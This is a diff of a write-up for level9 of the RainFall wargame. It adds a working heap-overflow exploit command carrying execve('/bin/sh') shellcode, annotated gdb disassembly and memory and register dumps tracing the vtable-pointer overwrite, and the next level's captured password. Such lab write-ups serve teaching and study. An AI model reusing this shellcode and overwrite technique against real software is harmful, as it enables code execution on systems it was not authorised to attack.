@@ -1,7 +1,10 @@
 
-## ideas
-ltrace ./level9 $(python -c "print 'a' * 104 + '\xf4\x85\x04\x08'")
+### Solution
+```
+./level9 $(python -c "print 'A' * 63 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x78\xa0\x04\x08'")
+```
 
+```
 info var
 (gdb) i var
 All defined variables:
@@ -9,18 +12,18 @@ Non-debugging symbols:
 0x08048840  vtable for N
 0x08048850  typeinfo name for N
 0x08048854  typeinfo for N
-
-
+```
+```
 info function
 0x080486f6  N::N(int)
 0x0804870e  N::setAnnotation(char*)
 0x0804873a  N::operator+(N&)
 0x0804874e  N::operator-(N&)
-
+```
 ➜  RainFall git:(main) ✗ c++filt  _Znwj (to demangle a C++ name)
 operator new(unsigned int)
 
-
+```
 Dump of assembler code for function main:
    0x080485f4 <+0>:	   push   ebp
    0x080485f5 <+1>:	   mov    ebp,esp
@@ -37,18 +40,18 @@ Dump of assembler code for function main:
    0x0804861e <+42>:	   mov    DWORD PTR [esp+0x4],0x5         ; move 5 to esp + 4
    0x08048626 <+50>:	   mov    DWORD PTR [esp],ebx             ; move ebx to esp
    0x08048629 <+53>:	   call   0x80486f6 <_ZN1NC2Ei>           ; _ZN1Nc2Ei(ebx, 5) / N::N(int) -> new N(5)
-   0x0804862e <+58>:	   mov    DWORD PTR [esp+0x1c],ebx        ; move ebx to esp+28
+   0x0804862e <+58>:	   mov    DWORD PTR [esp+0x1c],ebx        ; move ebx to esp+28 
    0x08048632 <+62>:	   mov    DWORD PTR [esp],0x6c            ;  put 108 to esp
    0x08048639 <+69>:	   call   0x8048530 <_Znwj@plt>           ; _Znwj(108); call to new
    0x0804863e <+74>:	   mov    ebx,eax                         ; move return value to ebx, points to address 0x804a078
    0x08048640 <+76>:	   mov    DWORD PTR [esp+0x4],0x6         ; move 6 to esp+4
    0x08048648 <+84>:	   mov    DWORD PTR [esp],ebx             ; move ebx to esp
    0x0804864b <+87>:	   call   0x80486f6 <_ZN1NC2Ei>           ; _ZN1NC2Ei(ebx, 6) / N::N(int) -> new N(6)
-   0x08048650 <+92>:	   mov    DWORD PTR [esp+0x18],ebx        ; move ebx to esp + 24
-   0x08048654 <+96>:	   mov    eax,DWORD PTR [esp+0x1c]        ; move exp + 28 to eax
-   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax        ; move eax to exp + 20 
-   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]        ; move esp + 24 to eax
-   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax        ; move eax to esp + 16
+   0x08048650 <+92>:	   mov    DWORD PTR [esp+0x18],ebx        ; move ebx to esp + 24 <<< move 0x804a078 to esp + 24
+   0x08048654 <+96>:	   mov    eax,DWORD PTR [esp+0x1c]        ; move esp + 28 to eax
+   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax        ; move eax to esp + 20 
+   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]        ; move esp + 24 to eax 
+   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax        ; move eax to esp + 16 : move 0x804a078 to esp + 16
    0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]         ; move esp + 12 to eax
    0x08048667 <+115>:	add    eax,0x4                         ; eax += 4
    0x0804866a <+118>:	mov    eax,DWORD PTR [eax]             ; move the dereference of eax to eax
@@ -56,14 +59,14 @@ Dump of assembler code for function main:
    0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]        ; move esp + 20 to eax
    0x08048674 <+128>:	mov    DWORD PTR [esp],eax             ; move eax to esp
    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> _ZN1N13setAnnotationEPc(esp+20, esp + 16) / N::setAnnotation(char*)
-   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]        ; move esp + 16 to eax
-   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]             ; move value in [eax] to eax
+   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]        ; move esp + 16 to eax; move 0x804a078 to eax
+   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]             ; move value in [eax] to eax; dereference move 0x804a078  --- if we overflow, instead of 0x08048848, we have... 0x804a078
    0x08048682 <+142>:	mov    edx,DWORD PTR [eax]             ; move value in eax to edx   ---> This is where we segfault
    0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]        ; move esp + 20 to eax
    0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax         ; move eax to esp + 4
    0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]        ; move esp + 16 to eax
    0x08048690 <+156>:	mov    DWORD PTR [esp],eax             ; move eax to esp
-   0x08048693 <+159>:	call   edx                             ; call edx => edx is a pointer to a function
+   0x08048693 <+159>:	call   edx                             ; call edx => edx is a function
    0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]         ; move ebp - 4 to ebx
    0x08048698 <+164>:	leave  
    0x08048699 <+165>:	ret    
@@ -135,7 +138,7 @@ Dump of assembler code for function _ZN1NmiERS_:
    0x08048763 <+21>:	pop    %ebp
    0x08048764 <+22>:	ret    
 End of assembler dump.
-
+```
 
 (gdb) run
 Starting program: /home/user/level9/level9 
@@ -186,3 +189,98 @@ $ whoami
 bonus0
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+---
+
+
+# NOTES
+
+
+Breaking at 0x08048677 (just before calling setAnnotation)
+```
+(gdb) x/28wx 0x0804a00c
+0x804a00c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a01c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a02c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a03c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a04c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a05c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a06c:      0x00000000      0x00000005      0x00000071      0x08048848
+```
+
+- with argument AAAA:
+```
+(gdb) x/28wx 0x0804a00c
+0x804a00c:      0x41414141      0x00000000      0x00000000      0x00000000
+0x804a01c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a02c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a03c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a04c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a05c:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a06c:      0x00000000      0x00000005      0x00000071      0x08048848
+```
+
+- with shellcode:
+```
+(gdb) x/28wx 0x0804a00c
+0x804a00c:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a01c:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a02c:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a03c:      0x41414141      0x41414141      0x41414141      0xeb414141
+0x804a04c:      0x76895e1f      0x88c03108      0x46890746      0x890bb00c
+0x804a05c:      0x084e8df3      0xcd0c568d      0x89db3180      0x80cd40d8
+0x804a06c:      0xffffdce8      0x69622fff      0x68732f6e      0x0804a078
+```
+
+At address 0x0804a078, we had 0x08048848. We overrid it with 0x0804a078.
+
+---
+
+Breaking at 0x08048693 (just before calling edx):
+
+- with argument AAAA:
+```
+(gdb) i r
+eax            0x804a078        134520952
+ecx            0x41414141       1094795585
+edx            0x804873a        134514490
+ebx            0x804a078        134520952
+(gdb) x/i 0x804873a
+   0x804873a <_ZN1NplERS_>:     push   %ebp
+(gdb) x/wx 0x804873a
+0x804873a <_ZN1NplERS_>:        0x8be58955
+```
+
+- with shellcode:
+```
+(gdb) i r
+eax            0x804a078        134520952
+ecx            0x804a078        134520952
+edx            0x804a078        134520952
+ebx            0x804a078        134520952
+(gdb) x/i 0x804a078
+   0x804a078:   js     0x804a01a
+(gdb) x/wx 0x804a078
+0x804a078:      0x0804a078
+```
+In the address 0x0804a078, we stocked an assembly operation `0x0804a078`, which corresponds to `js     0x804a01a`
+
+source. test
+
+- with AAAA
+```
+(gdb) i r
+eax            0x80487d8        134514648
+ecx            0x41414141       1094795585
+edx            0x9b05008        162549768
+ebx            0x9b05078        162549880
+```
+
+- with shellcode:
+```
+(gdb) i r
+eax            0x80487d8        134514648
+ecx            0x804a078        134520952
+edx            0x9d93008        165228552
+ebx            0x9d93078        165228664
+```
